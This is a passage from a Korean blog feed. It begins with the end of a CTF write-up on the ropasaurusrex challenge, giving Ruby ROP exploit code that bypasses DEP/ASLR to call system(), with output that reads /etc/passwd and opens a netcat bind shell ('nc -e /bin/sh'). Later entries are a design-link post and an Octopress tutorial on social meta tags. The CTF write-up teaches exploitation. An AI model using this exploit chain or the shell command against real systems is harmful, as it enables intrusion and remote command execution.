</span><span class='line'><span class="c1"># The difference between read() and system()</span>
</span><span class='line'><span class="c1"># Calculated as  read (0xb7f48110) - system (0xb7ec2450)</span>
</span><span class='line'><span class="c1"># Note: This is the one number that needs to be calculated using the</span>
</span><span class='line'><span class="c1"># target version of libc rather than my own!</span>
</span><span class='line'><span class="n">read_system_diff</span> <span class="o">=</span> <span class="mh">0x85cc0</span>
</span><span class='line'>
</span><span class='line'><span class="c1"># Generate the payload</span>
</span><span class='line'><span class="n">payload</span> <span class="o">=</span> <span class="s2">&quot;A&quot;</span><span class="o">*</span><span class="mi">140</span> <span class="o">+</span>
</span><span class='line'>  <span class="o">[</span>
</span><span class='line'>    <span class="c1"># system()&#39;s stack frame</span>
</span><span class='line'>    <span class="n">buf</span><span class="p">,</span>         <span class="c1"># writable memory (cmd buf)</span>
</span><span class='line'>    <span class="mh">0x44444444</span><span class="p">,</span>  <span class="c1"># system()&#39;s return address</span>
</span><span class='line'>
</span><span class='line'>    <span class="c1"># pop/pop/pop/ret&#39;s stack frame</span>
</span><span class='line'>    <span class="c1"># Note that this calls read_addr, which is overwritten by a pointer</span>
</span><span class='line'>    <span class="c1"># to system() in the previous stack frame</span>
</span><span class='line'>    <span class="n">read_addr</span><span class="p">,</span>   <span class="c1"># (this will become system())</span>
</span><span class='line'>
</span><span class='line'>    <span class="c1"># second read()&#39;s stack frame</span>
</span><span class='line'>    <span class="c1"># This reads the address of system() from the socket and overwrites</span>
</span><span class='line'>    <span class="c1"># read()&#39;s .plt entry with it, so calls to read() end up going to</span>
</span><span class='line'>    <span class="c1"># system()</span>
</span><span class='line'>    <span class="mi">4</span><span class="p">,</span>           <span class="c1"># length of an address</span>
</span><span class='line'>    <span class="n">read_addr_ptr</span><span class="p">,</span> <span class="c1"># address of read()&#39;s .plt entry</span>
</span><span class='line'>    <span class="mi">0</span><span class="p">,</span>           <span class="c1"># stdin</span>
</span><span class='line'>    <span class="n">pppr_addr</span><span class="p">,</span>   <span class="c1"># read()&#39;s return address</span>
</span><span class='line'>
</span><span class='line'>    <span class="c1"># pop/pop/pop/ret&#39;s stack frame</span>
</span><span class='line'>    <span class="n">read_addr</span><span class="p">,</span>
</span><span class='line'>
</span><span class='line'>    <span class="c1"># write()&#39;s stack frame</span>
</span><span class='line'>    <span class="c1"># This frame gets the address of the read() function from the .plt</span>
</span><span class='line'>    <span class="c1"># entry and writes to to stdout</span>
</span><span class='line'>    <span class="mi">4</span><span class="p">,</span>           <span class="c1"># length of an address</span>
</span><span class='line'>    <span class="n">read_addr_ptr</span><span class="p">,</span> <span class="c1"># address of read()&#39;s .plt entry</span>
</span><span class='line'>    <span class="mi">1</span><span class="p">,</span>           <span class="c1"># stdout</span>
</span><span class='line'>    <span class="n">pppr_addr</span><span class="p">,</span>   <span class="c1"># retrurn address</span>
</span><span class='line'>
</span><span class='line'>    <span class="c1"># pop/pop/pop/ret&#39;s stack frame</span>
</span><span class='line'>    <span class="n">write_addr</span><span class="p">,</span>
</span><span class='line'>
</span><span class='line'>    <span class="c1"># read()&#39;s stack frame</span>
</span><span class='line'>    <span class="c1"># This reads the command we want to run from the socket and puts it</span>
</span><span class='line'>    <span class="c1"># in our writable &quot;buf&quot;</span>
</span><span class='line'>    <span class="n">cmd</span><span class="o">.</span><span class="n">length</span><span class="p">,</span>  <span class="c1"># number of bytes</span>
</span><span class='line'>    <span class="n">buf</span><span class="p">,</span>         <span class="c1"># writable memory (cmd buf)</span>
</span><span class='line'>    <span class="mi">0</span><span class="p">,</span>           <span class="c1"># stdin</span>
</span><span class='line'>    <span class="n">pppr_addr</span><span class="p">,</span>   <span class="c1"># read()&#39;s return address</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">read_addr</span> <span class="c1"># Overwrite the original return</span>
</span><span class='line'>  <span class="o">].</span><span class="n">reverse</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s2">&quot;I*&quot;</span><span class="p">)</span> <span class="c1"># Convert a series of &#39;ints&#39; to a string</span>
</span><span class='line'>
</span><span class='line'><span class="c1"># Write the &#39;exploit&#39; payload</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c1"># When our payload calls read() the first time, this is read</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c1"># Get the result of the first read() call, which is the actual address of read</span>
</span><span class='line'><span class="n">this_read_addr</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s2">&quot;I&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">first</span>
</span><span class='line'>
</span><span class='line'><span class="c1"># Calculate the address of system()</span>
</span><span class='line'><span class="n">this_system_addr</span> <span class="o">=</span> <span class="n">this_read_addr</span> <span class="o">-</span> <span class="n">read_system_diff</span>
</span><span class='line'>
</span><span class='line'><span class="c1"># Write the address back, where it&#39;ll be read() into the correct place by</span>
</span><span class='line'><span class="c1"># the second read() call</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="o">[</span><span class="n">this_system_addr</span><span class="o">].</span><span class="n">pack</span><span class="p">(</span><span class="s2">&quot;I&quot;</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'><span class="c1"># Finally, read the result of the actual command</span>
</span><span class='line'><span class="nb">puts</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">read</span><span class="p">())</span>
</span><span class='line'>
</span><span class='line'><span class="c1"># Clean up</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></code></pre></td></tr></table></div></figure>


<p>그리고 실행 결과다:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'><span class="nv">$ </span>ruby sploit.rb <span class="s2">&quot;cat /etc/passwd&quot;</span>
</span><span class='line'>root:x:0:0:root:/root:/bin/bash
</span><span class='line'>daemon:x:1:1:daemon:/usr/sbin:/bin/sh
</span><span class='line'>bin:x:2:2:bin:/bin:/bin/sh
</span><span class='line'>sys:x:3:3:sys:/dev:/bin/sh
</span><span class='line'><span class="o">[</span>...<span class="o">]</span>
</span></code></pre></td></tr></table></div></figure>


<p>물론 <code>cat /etc/passwd</code>를 원하는 값으로 바꿀 수 있다 (netcat 리스너를 포함해서!).</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'>ron@debian-x86 ~ <span class="nv">$ </span>ruby sploit.rb <span class="s2">&quot;pwd&quot;</span>
</span><span class='line'>/home/ron
</span><span class='line'>ron@debian-x86 ~ <span class="nv">$ </span>ruby sploit.rb <span class="s2">&quot;whoami&quot;</span>
</span><span class='line'>ron
</span><span class='line'>ron@debian-x86 ~ <span class="nv">$ </span>ruby sploit.rb <span class="s2">&quot;nc -vv -l -p 5555 -e /bin/sh&quot;</span> <span class="p">&amp;</span>
</span><span class='line'><span class="o">[</span>1<span class="o">]</span> 3015
</span><span class='line'>ron@debian-x86 ~ <span class="nv">$ </span>nc -vv localhost 5555
</span><span class='line'>debian-x86.skullseclabs.org <span class="o">[</span>127.0.0.1<span class="o">]</span> 5555 <span class="o">(</span>?<span class="o">)</span> open
</span><span class='line'><span class="nb">pwd</span>
</span><span class='line'>/home/ron
</span><span class='line'>whoami
</span><span class='line'>ron
</span></code></pre></td></tr></table></div></figure>


<h2><a id="conclusion"></a>결론</h2>

<p>이게 끝이다! 난 믿을 만한, DEP/ASLR을 우회하는 ropasaurusrex 익스플로잇을 만들었다.</p>

<p>질문이 있다면 댓글을 달거나 나에게 연락해주길 바란다!</p>
<div class="footnotes">
<hr/>
<ol>
<li id="fn:1">
<p>링크가 <a href="https://wiki.skullsecurity.org/Assembly">바뀌었다</a>.<a href="#fnref:1" rev="footnote">&#8617;</a></p></li>
</ol>
</div>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Design Details: Paper by Facebook &rarr;]]></title>
    <link href="http://yous.be/2014/03/04/design-details-paper-by-facebook/"/>
    <updated>2014-03-04T22:02:47+09:00</updated>
    <id>http://yous.be/2014/03/04/design-details-paper-by-facebook</id>
    <content type="html"><![CDATA[<p><a href="http://blog.brianlovin.com/">Brian Lovin</a>이 쓴 <a href="http://blog.brianlovin.com/design-details-paper-by-facebook">페이스북 Paper의 디자인 디테일</a>에 관한 글이다.</p>

<blockquote><p><a href="https://itunes.apple.com/us/app/paper-stories-from-facebook/id794163692">페이스북 Paper</a>가 나온 지 하루가 지났고 대부분의 리뷰가 <a href="https://news.ycombinator.com/item?id=7171808">다소 갈리고 있다</a>. 나는 페이스북의 열성적 팬은 아니지만, Paper의 디자인과 디테일에 쏟은 관심은 비길 데 없으며 이는 다른 디자이너들과 공유할 가치가 있다.</p></blockquote>

<p>Paper 앱의 애니메이션을 총 23종의 GIF 파일로 기록하고 리뷰해 놓았다. Paper 앱이 출시되고 꽤 시간이 지났지만 앱을 사용하면서 눈치채지 못했던 점이 많아 지금이라도 공유한다.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Octopress에서 Facebook Open Graph와 Twitter Cards 지원하기]]></title>
    <link href="http://yous.be/2014/02/24/support-facebook-open-graph-and-twitter-cards-on-octopress/"/>
    <updated>2014-02-24T21:50:36+09:00</updated>
    <id>http://yous.be/2014/02/24/support-facebook-open-graph-and-twitter-cards-on-octopress</id>
    <content type="html"><![CDATA[<p>블로그에 글을 쓰고 나면 트위터나 페이스북에 링크를 공유하곤 하는데 페이스북의 미리보기가 적절히 표시되지 않고 있다는 사실을 깨달았다. 또한 트위터도 그와 비슷한 기능을 제공하는데, 둘 다 지원하면 좋겠다는 생각을 했다. 이를 제대로 지원하려면 <a href="https://developers.facebook.com/docs/opengraph/howtos/maximizing-distribution-media-content#tags">Facebook Open Graph tags</a>와 <a href="https://dev.twitter.com/docs/cards">Twitter Cards</a>에 대해 알아야 한다. 웹 페이지에 적절한 <a href="http://en.wikipedia.org/wiki/Meta_element">메타 태그</a>를 추가해 주면 페이스북과 트위터에서 인식하고 올바른, 작성자가 의도한 미리보기를 보여준다. 기본적으로 Zac Clancy가 쓴 <a href="http://blackglasses.me/2013/09/19/twitter-cards-facebook-open-graph-and-octopress/">Octopress에서 이 두 가지를 지원하는 글</a>에 상세히 설명되어 있다.</p>

<!-- more -->


<h2><a id="facebook-open-graph-tags"></a>Facebook Open Graph Tags</h2>

<p><img src="https://fbcdn-dragon-a.akamaihd.net/hphotos-ak-prn1/t39.2178/851562_1376970469205025_523101852_n.png"></p>

<p>페이스북에 웹 페이지가 제대로 인식되게 하려면 <a href="https://developers.facebook.com/docs/opengraph/howtos/maximizing-distribution-media-content#tags">Open Graph 태그</a>를 이용해야 한다. 기본적으로 채워야 할 태그들은 다음과 같다:</p>

<ul>
<li><code>og:title</code>: 사이트 이름 등의 브랜드를 제외한 글 제목이다.</li>
<li><code>og:site_name</code>: 웹 사이트의 이름이다. URL이 아니라 이름이다. (예: &ldquo;imdb.com&#8221;이 아닌 &#8220;IMDb&rdquo;)</li>
<li><code>og:url</code>: 글의 고유 식별자가 된다. 검색 엔진 최적화를 위해 사용된 <a href="http://en.wikipedia.org/wiki/Canonical_link_element">표준(canonical) URL</a>과 연결되어야 하며, 어떤 세션 변수나 사용자 식별 인자나 카운터를 포함하지 않아야 한다. 만약 이 부분을 잘못 사용하게 되면, &lsquo;좋아요&#8217;와 &#8216;공유&#8217;의 수가 이 URL로 합해지지 않고 이 URL의 모든 변형으로 흩어질 것이다.</li>
<li><code>og:description</code>: 내용 일부를 상세히 설명한 글로, 보통 2~4문장이다. 이 태그는 선택 가능하지만 사람들이 읽고 공유하는 비율을 높일 수 있다.</li>
<li><code>og:image</code>: 연관된 이미지다. 최소 1200x630 픽셀 크기의 이미지 사용을 추천한다.</li>
<li><code>fb:app_id</code>: 페이스북이 사이트의 신원을 파악할 수 있게 해 주는 고유 ID다. Facebook Insights가 제대로 동작하는 데에 중요하다. 자세한 내용은 <a href="https://developers.facebook.com/docs/insights/">Insights 문서</a>에서 확인할 수 있다.</li>
</ul>


<p>다른 종류의 태그를 더 추가할 수도 있다:</p>

<ul>
<li><code>og:type</code>: 페이스북의 뉴스피드는 당신의 글을 미디어 종류에 따라 다르게 보여준다.<a href="http://ogp.me/#types">일반적으로 쓰이는 오브젝트 타입</a>은 이미 정의되어 있다. 만약 오브젝트 타입을 설정하지 않으면 기본 타입으로 <code>website</code>가 쓰인다. Open Graph를 통해 당신만의 타입을 정할 수도 있다.</li>
<li><code>og:locale</code>: 리소스의 언어다. 기본 설정은 <code>en_US</code>다. <code>og:locale:alternate</code>를 통해 다른 언어도 가능하다는 것을 나타낼 수 있다. 예제와 추가 정보는 <a href="https://developers.facebook.com/docs/internationalization/">국제화</a>와 <a href="https://developers.facebook.com/docs/technical-guides/opengraph/internationalization/">Open Graph 국제화</a> 페이지를 보라.</li>
<li><code>article:author</code>: <a href="https://developers.facebook.com/docs/reference/opengraph/object-type/article">글의 저자들로 통하는 링크</a>다. 링크 주소는 뉴스피드에 나타났을 때 저자를 팔로우 할 수 있는 페이스북 프로필이나 페이스북 페이지가 될 수 있다. (저자들은 사람들이 팔로우 할 수 있게 <a href="https://developers.facebook.com/docs/opengraph/howtos/maximizing-distribution-media-content#follow">팔로우</a> 기능을 켜 두어야 한다.)</li>
<li><code>article:publisher</code>: <a href="https://developers.facebook.com/docs/reference/opengraph/object-type/article">글의 발행인으로 통하는 링크</a>다. 링크 주소는 페이스북 페이지여야 한다. 페이스북은 발행인이 뉴스피드에 표시되었을 때 그것을 &lsquo;좋아요&rsquo; 하는 기능을 제공할 수 있다. 이 태그는 미디어 발행인만 쓸 수 있다.</li>
</ul>


<h2><a id="twitter-cards"></a>Twitter Cards</h2>

<p><a href="https://dev.twitter.com/docs/cards">Twitter Cards</a>는 트윗 자체에 링크의 내용을 보여주는 &lsquo;카드&#8217;를 추가하는 기능이다.</p>

<p><img src="https://dev.twitter.com/sites/default/files/images_documentation/web_summary_0.png"></p>

<p>카드의 종류는 7개가 있으며 원하는 용도에 따라 적절히 사용할 수 있다.</p>

<ul>
<li><a href="https://dev.twitter.com/docs/cards/types/summary-card">Summary Card</a>: 기본 카드. 제목, 설명, 섬네일, 트위터 계정을 포함하고 있다.</li>
<li><a href="https://dev.twitter.com/docs/cards/large-image-summary-card">Summary Card with Large Image</a>: Summary Card와 비슷하지만 이미지를 강조할 수 있다.</li>
<li><a href="https://dev.twitter.com/docs/cards/types/photo-card">Photo Card</a>: 트윗 형태의 사진 카드.</li>
<li><a href="https://dev.twitter.com/docs/cards/types/gallery-card">Gallery Card</a>: 여러 사진을 강조하기 위한 카드다.</li>
<li><a href="https://dev.twitter.com/docs/cards/types/app-card">App Card</a>: 애플리케이션 정보를 제공하기 위한 카드다.</li>
<li><a href="https://dev.twitter.com/docs/cards/types/player-card">Player Card</a>: 트윗 형태의 비디오/오디오/미디어 재생 카드다.</li>
<li><a href="https://dev.twitter.com/docs/cards/types/product-card">Product Card</a>: 상품 내용을 더 잘 나타내기 위한 트윗 카드다.</li>
</ul>


<p>트위터는 <a href="https://dev.twitter.com/docs/cards/validation/validator">카드 검사 도구</a>를 직접 제공하고 있으므로 각 종류의 카드가 어떻게 보이는지, 자신의 사이트가 제대로 인식되는지 테스트 해볼 수 있다.</p>

<h2><a id="support-in-octopress"></a>Octopress에서 지원하기</h2>

<p>페이스북 Open Graph를 위한 설정 값을 <code>_config.yml</code>에 추가한다.</p>

<figure class='code'><figcaption><span>_config.yml</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='yaml'><span class='line'><span class="nn">...</span>
</span><span class='line'><span class="c1"># Facebook Insights / Open Graph</span>
</span><span class='line'><span class="l-Scalar-Plain">facebook_app_id</span><span class="p-Indicator">:</span>
</span><span class='line'><span class="l-Scalar-Plain">facebook_page</span><span class="p-Indicator">:</span>
</span></code></pre></td></tr></table></div></figure>


<p>페이스북 App ID는 <a href="https://www.facebook.com/insights/">페이스북 인사이트</a>에서 &lsquo;웹사이트를 위한 인사이트&rsquo; 버튼을 눌러 얻을 수 있다. 페이스북 페이지 주소는 <code>article:author</code>에 사용될 정보지만 입력하지 않아도 된다. 트위터는 <code>_config.yml</code>의 <code>twitter_user</code> 값을 이용해 메타 태그를 입력한다. 이 역시 입력하지 않아도 된다.</p>

<p>Octopress에서 사이트에 메타 태그를 추가하는 방법은 간단하다. 일단 <code>source/_includes/custom/head.html</code> 파일에 다음 코드를 추가하자.</p>

<figure class='code'><figcaption><span>source/_includes/custom/head.html</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'>...
</span><span class='line'><span class="c">&lt;!-- Social media content metadata --&gt;</span>
</span><span class='line'>{% if site.facebook_app_id %}
</span><span class='line'>  <span class="nt">&lt;meta</span> <span class="na">property=</span><span class="s">&quot;fb:admins&quot;</span> <span class="na">content=</span><span class="s">&quot;{{ site.facebook_app_id }}&quot;</span><span class="nt">&gt;</span>
</span><span class='line'>  <span class="nt">&lt;meta</span> <span class="na">property=</span><span class="s">&quot;og:title&quot;</span> <span class="na">content=</span><span class="s">&quot;{% if page.title %}{{ page.title }}{% else %}{{ site.title }}{% endif %}&quot;</span><span class="nt">&gt;</span>
</span><span class='line'>  <span class="nt">&lt;meta</span> <span class="na">property=</span><span class="s">&quot;og:site_name&quot;</span> <span class="na">content=</span><span class="s">&quot;{{ site.title }}&quot;</span><span class="nt">&gt;</span>
</span><span class='line'>  <span class="nt">&lt;meta</span> <span class="na">property=</span><span class="s">&quot;og:url&quot;</span> <span class="na">content=</span><span class="s">&quot;{% if canonical %}{{ canonical }}{% else %}{{ site.url }}{% endif %}&quot;</span><span class="nt">&gt;</span>
</span><span class='line'>  <span class="nt">&lt;meta</span> <span class="na">property=</span><span class="s">&quot;og:description&quot;</span> <span class="na">content=</span><span class="s">&quot;{{ description | strip_html | condense_spaces | truncate:200 }}&quot;</span><span class="nt">&gt;</span>
</span><span class='line'>  {% if site.facebook_page %}
</span><span class='line'>    <span class="nt">&lt;meta</span> <span class="na">property=</span><span class="s">&quot;article:author&quot;</span> <span class="na">content=</span><span class="s">&quot;{{ site.facebook_page }}&quot;</span><span class="nt">&gt;</span>
</span><span class='line'>  {% endif %}
</span><span class='line'>  {% if page.facebook.image %}
</span><span class='line'>    <span class="nt">&lt;meta</span> <span class="na">property=</span><span class="s">&quot;og:image&quot;</span> <span class="na">content=</span><span class="s">&quot;{{ page.facebook.image }}&quot;</span><span class="nt">&gt;</span>
</span><span class='line'>  {% endif %}
</span><span class='line'>{% endif %}
</span><span class='line'><span class="nt">&lt;meta</span> <span class="na">name=</span><span class="s">&quot;twitter:card&quot;</span> <span class="na">content=</span><span class="s">&quot;{% if page.twitter_card.type %}{{ page.twitter_card.type }}{% else %}summary{% endif %}&quot;</span><span class="nt">&gt;</span>
</span><span class='line'>{% if site.twitter_user %}
</span><span class='line'>  <span class="nt">&lt;meta</span> <span class="na">name=</span><span class="s">&quot;twitter:site&quot;</span> <span class="na">content=</span><span class="s">&quot;{{ site.twitter_user }}&quot;</span><span class="nt">&gt;</span>
</span><span class='line'>{% endif %}
</span><span class='line'><span class="nt">&lt;meta</span> <span class="na">name=</span><span class="s">&quot;twitter:title&quot;</span> <span class="na">content=</span><span class="s">&quot;{% if page.title %}{{ page.title | truncate:70 }}{% else %}{{ site.title | truncate:70 }}{% endif %}&quot;</span><span class="nt">&gt;</span>
</span><span class='line'><span class="nt">&lt;meta</span> <span class="na">name=</span><span class="s">&quot;twitter:description&quot;</span> <span class="na">content=</span><span class="s">&quot;{{ description | strip_html | condense_spaces | truncate:200 }}&quot;</span><span class="nt">&gt;</span>
</span><span class='line'>{% if page.twitter_card.creator %}
</span><span class='line'>  <span class="nt">&lt;meta</span> <span class="na">name=</span><span class="s">&quot;twitter:creator&quot;</span> <span class="na">content=</span><span class="s">&quot;{{ page.twitter_card.creator }}&quot;</span><span class="nt">&gt;</span>
</span><span class='line'>{% elsif site.twitter_user %}
</span><span class='line'>  <span class="nt">&lt;meta</span> <span class="na">name=</span><span class="s">&quot;twitter:creator&quot;</span> <span class="na">content=</span><span class="s">&quot;{{ site.twitter_user }}&quot;</span><span class="nt">&gt;</span>
</span><span class='line'>{% endif %}
</span><span class='line'>{% if page.twitter_card.image %}
</span><span class='line'>  {% if page.twitter_card.type == &#39;gallery&#39; %}
</span><span class='line'>    <span class="nt">&lt;meta</span> <span class="na">name=</span><span class="s">&quot;twitter:image0&quot;</span> <span class="na">content=</span><span class="s">&quot;{{ page.twitter_card.image }}&quot;</span><span class="nt">&gt;</span>
</span><span class='line'>    <span class="nt">&lt;meta</span> <span class="na">name=</span><span class="s">&quot;twitter:image1&quot;</span> <span class="na">content=</span><span class="s">&quot;{{ page.twitter_card.image1 }}&quot;</span><span class="nt">&gt;</span>
</span><span class='line'>    <span class="nt">&lt;meta</span> <span class="na">name=</span><span class="s">&quot;twitter:image2&quot;</span> <span class="na">content=</span><span class="s">&quot;{{ page.twitter_card.image2 }}&quot;</span><span class="nt">&gt;</span>
</span><span class='line'>    <span class="nt">&lt;meta</span> <span class="na">name=</span><span class="s">&quot;twitter:image3&quot;</span> <span class="na">content=</span><span class="s">&quot;{{ page.twitter_card.image3 }}&quot;</span><span class="nt">&gt;</span>
</span><span class='line'>  {% else %}
</span><span class='line'>    <span class="nt">&lt;meta</span> <span class="na">name=</span><span class="s">&quot;twitter:image:src&quot;</span> <span class="na">content=</span><span class="s">&quot;{{ page.twitter_card.image }}&quot;</span><span class="nt">&gt;</span>
</span><span class='line'>    {% if page.twitter_card.type == &#39;photo&#39; %}
</span><span class='line'>      {% if page.twitter_card.width %}
</span><span class='line'>        <span class="nt">&lt;meta</span> <span class="na">name=</span><span class="s">&quot;twitter:image:width&quot;</span> <span class="na">content=</span><span class="s">&quot;{{ page.twitter_card.width }}&quot;</span><span class="nt">&gt;</span>
</span><span class='line'>      {% endif %}
</span><span class='line'>      {% if page.twitter_card.height %}
</span><span class='line'>        <span class="nt">&lt;meta</span> <span class="na">name=</span><span class="s">&quot;twitter:image:height&quot;</span> <span class="na">content=</span><span class="s">&quot;{{ page.twitter_card.height }}&quot;</span><span class="nt">&gt;</span>
</span><span class='line'>      {% endif %}
</span><span class='line'>    {% endif %}
</span><span class='line'>  {% endif %}
</span><span class='line'>{% endif %}
</span></code></pre></td></tr></table></div></figure>


<p>페이스북에 링크를 첨부해 상태를 올리면 메타 태그 기반으로 미리보기를 생성해 준다. 다만 트위터의 경우 사이트 등록이 필요하다. <a href="https://dev.twitter.com/docs/cards/validation/validator">카드 검사 도구</a> 페이지에서 사이트가 검사에 통과하면 도메인 인증 요청을 보낼 수 있다. 이 요청이 통과되면 트위터에서 사이트 링크를 트위터 카드로 만들어 보여준다.</p>

<p>추가로 설정 가능한 몇 가지 옵션에 대해 설명하겠다.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class='yaml'><span class='line'><span class="nn">---</span>
</span><span class='line'><span class="l-Scalar-Plain">layout</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">post</span>
</span><span class='line'><span class="l-Scalar-Plain">title</span><span class="p-Indicator">:</span> <span class="s">&quot;An</span><span class="nv"> </span><span class="s">example</span><span class="nv"> </span><span class="s">post&quot;</span>
</span><span class='line'><span class="l-Scalar-Plain">date</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">2014-02-24</span>
</span><span class='line'><span class="l-Scalar-Plain">comments</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">false</span>
</span><span class='line'><span class="l-Scalar-Plain">categories</span><span class="p-Indicator">:</span>
</span><span class='line'>    <span class="p-Indicator">-</span> <span class="l-Scalar-Plain">Example</span>
</span><span class='line'><span class="l-Scalar-Plain">description</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">This is an example post.</span>
</span><span class='line'><span class="l-Scalar-Plain">facebook</span><span class="p-Indicator">:</span>
</span><span class='line'>    <span class="l-Scalar-Plain">image</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">http://example.com/path/to/image.png</span>
</span><span class='line'><span class="l-Scalar-Plain">twitter_card</span><span class="p-Indicator">:</span>
</span><span class='line'>    <span class="l-Scalar-Plain">creator</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">twitter</span>
</span><span class='line'>    <span class="l-Scalar-Plain">type</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">summary_large_image</span>
</span><span class='line'>    <span class="l-Scalar-Plain">image</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">http://example.com/path/to/image.png</span>
</span><span class='line'><span class="nn">---</span>
</span></code></pre></td></tr></table></div></figure>


<p>글에 <code>description</code> 태그를 사용하면 그 값이 description으로 사용된다. 만약 없다면 글 앞부분이 사용된다. <code>facebook</code> 태그 아래에 <code>image</code> 태그를 사용하면 페이스북의 미리보기 이미지로 사용된다. <code>twitter_card</code> 태그 아래의 <code>image</code>도 마찬가지이다. 추가로 <code>twitter_card</code> 태그 아래에 <code>type</code>을 명시할 수 있고, <code>creator</code> 태그를 사용하면 <code>_config.yml</code>의 <code>twitter_user</code> 대신 그 값을 사용한다. <code>facebook</code> 태그와 <code>twitter_card</code> 태그 모두 추가 옵션으로 입력하지 않아도 관계없다.</p>

<p>위 코드가 모든 트위터 카드를 지원하는 것은 아니다. 기본적으로 <code>twitter_card</code>의 <code>image</code> 태그를 입력하면 <code>summary</code>, <code>summary_large_image</code>, <code>photo</code> 타입을 사용할 수 있다. <code>photo</code> 타입은 추가적인 태그를 사용할 수 있다.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class='yaml'><span class='line'><span class="nn">---</span>
</span><span class='line'><span class="l-Scalar-Plain">layout</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">post</span>
</span><span class='line'><span class="l-Scalar-Plain">title</span><span class="p-Indicator">:</span> <span class="s">&quot;An</span><span class="nv"> </span><span class="s">example</span><span class="nv"> </span><span class="s">post&quot;</span>
</span><span class='line'><span class="l-Scalar-Plain">date</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">2014-02-24</span>
</span><span class='line'><span class="l-Scalar-Plain">comments</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">false</span>
</span><span class='line'><span class="l-Scalar-Plain">categories</span><span class="p-Indicator">:</span>
